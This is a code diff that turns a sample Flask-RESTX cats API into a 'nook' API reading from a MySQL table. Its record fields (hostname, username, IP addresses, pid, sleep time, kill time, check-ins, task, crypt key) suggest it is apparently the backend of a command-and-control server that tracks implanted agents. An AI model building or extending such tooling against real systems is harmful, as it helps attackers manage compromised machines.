@@ -1,38 +1,58 @@
+""" The api for web interface - purely feeds the UI """
 from flask_restx import Namespace, Resource, fields
 
-api = Namespace("cats", description="Cats related operations")
+from db import mysql
 
-cat = api.model(
-    "Cat",
+api = Namespace("nook", description="Web api for nook related operations")
+
+nook = api.model(
+    "Nook",
     {
-        "id": fields.String(required=True, description="The cat identifier"),
-        "name": fields.String(required=True, description="The cat name"),
+        "id": fields.String(required=True),
+        "guid": fields.String(required=True),
+        "active": fields.Boolean(required=True),
+        "ipAddrExt": fields.String(required=True),
+        "ipAddrInt": fields.String(required=True),
+        "username": fields.String(required=True),
+        "hostname": fields.String(required=True),
+        "os": fields.String(required=True),
+        "osBuild": fields.String(required=True),
+        "osVersion": fields.String(required=True),
+        "pid": fields.Integer(required=True),
+        "sleepTimeSeconds": fields.Integer(required=True),
+        "killTimeHours": fields.Integer(required=True),
+        "firstCheckIn": fields.Integer(required=True),
+        "lastCheckIn": fields.Integer(required=True),
+        "task": fields.String(required=False),
+        "hostingFile": fields.String(required=False),
+        "cryptKey": fields.String(required=True)
     },
 )
 
-CATS = [
-    {"id": "felix", "name": "Felix"},
-]
-
 
 @api.route("/")
-class CatList(Resource):
-    @api.doc("list_cats")
-    @api.marshal_list_with(cat)
+class NookList(Resource):
+    @api.doc("list_nooks")
+    @api.marshal_list_with(nook)
     def get(self):
-        """List all cats"""
-        return CATS
+        """List all nooks"""
+        cur = mysql.connection.cursor()
+        cur.execute('SELECT * from nooks')
+        categories = cur.fetchall()
+        cur.close()
+        return list(categories)
 
 
-@api.route("/<id>")
-@api.param("id", "The cat identifier")
-@api.response(404, "Cat not found")
-class Cat(Resource):
-    @api.doc("get_cat")
-    @api.marshal_with(cat)
-    def get(self, id):
-        """Fetch a cat given its identifier"""
-        for cat in CATS:
-            if cat["id"] == id:
-                return cat
-        api.abort(404)
+@api.route("/<guid>")
+@api.param("guid", "The nook identifier")
+@api.response(404, "Nook not found")
+class Nook(Resource):
+    @api.doc("get nook by guid")
+    @api.marshal_with(nook)
+    def get(self, guid):
+        """Fetch a nook given its identifier"""
+        cur = mysql.connection.cursor()
+        cur.execute("SELECT * from nooks where guid = %s", [guid])
+        categories = cur.fetchall()
+        cur.close()
+        return list(categories)
